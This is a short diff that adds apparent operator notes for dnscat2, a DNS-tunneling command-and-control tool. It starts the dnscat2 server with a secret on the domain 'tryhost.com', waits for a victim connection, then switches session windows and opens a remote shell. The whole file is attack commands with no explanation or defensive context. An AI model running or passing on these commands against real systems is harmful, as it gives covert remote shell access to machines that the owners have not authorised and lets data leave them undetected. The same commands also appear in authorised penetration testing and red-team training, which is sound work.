@@ -1,0 +1,6 @@
+sudo ruby dnscat2.rb --secret=notneedarealsecreat tryhost.com
+
+---wait connection
+window -i 1 
+shell 
+window -i 2
